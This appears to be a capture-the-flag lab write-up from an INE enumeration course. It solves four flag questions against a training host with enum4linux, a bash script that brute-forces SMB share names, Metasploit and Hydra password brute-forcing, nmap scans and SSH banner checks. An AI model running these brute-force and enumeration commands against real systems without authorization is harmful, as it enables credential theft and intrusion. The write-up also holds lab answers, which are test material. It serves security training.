# Assessment Methodologies: Enumeration

## Questions and Resolutions

### Q1. There is a samba share that allows anonymous access. Wonder whatâ€™s in there!

**Resolution:**  
Use enum4linux to determine which shares allow anonymous login.
```bash
enum4linux -a target.ine.local
```
If no shares allow anonymous access, brute-force the shares using a script with a wordlist (example script below):

```bash
#!/bin/bash
TARGET="target.ine.local"
WORDLIST="/root/Desktop/wordlists/shares.txt"
while read -r SHARE; do
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    fi
done < "$WORDLIST"
```
Once found, access the share:
```bash
smbclient //target.ine.local/pubfiles -N
```
Download and read the file using `cat`.

### Q2. One of the samba users has a bad password. Their private share with the same name as their username is at risk!

**Resolution:**  
Identify usernames using enum4linux (e.g., josh, bob, nancy, alice). Use Metasploit's smb_login module to enumerate weak passwords:
- Set a users.txt file with these usernames.
- Set a password wordlist as PASS_FILE.

Example:
```
use auxiliary/scanner/smb/smb_login
set USER_FILE users.txt
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
set RHOSTS target.ine.local
run
```
Once you discover valid credentials, log in:
```bash
smbclient //target.ine.local/josh -U josh
```
Download and read the file.

### Q3. Follow the hint given in the previous flag to uncover this one.

**Resolution:**  
If you find a hint about the FTP service, use nmap to check open ports:
```bash
nmap -p- target.ine.local
```
If FTP is on a non-standard port (e.g., 5554), brute-force weak credentials with Hydra:
```bash
hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
```
Log in with discovered credentials, download the file, and read its contents.

### Q4. This is a warning meant to deter unauthorized users from logging in.

**Resolution:**  
Review nmap results to identify an SSH service. Try to connect and investigate banners or messages for further information.
